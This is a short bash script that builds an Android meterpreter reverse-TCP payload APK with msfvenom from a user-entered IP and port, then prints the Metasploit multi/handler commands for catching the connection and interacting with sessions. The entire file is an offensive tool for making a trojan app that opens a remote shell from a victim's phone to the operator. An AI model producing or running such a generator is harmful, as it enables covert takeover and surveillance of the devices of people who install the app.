#!/bin/bash


clear
ifconfig
read -p "Enter payload ip: " n1
read -p "Enter payload port: " n2
read -p "Enter payload name: " n3
read -p "saved payload path: " n4

msfvenom -p android/meterpreter/reverse_tcp LHOST=$n1 LPORT=$n2 -o $n3.apk

mv $n3.apk $n4
echo "
         msfconsole
        use exploit/multi/handler
        set payload android/meterpreter/reverse_tcp
        set LHOST $n1
        set LPORT $n2
=> run a payload <=

exploit -j
sessions -i
sessions -i {type session number}


        
      "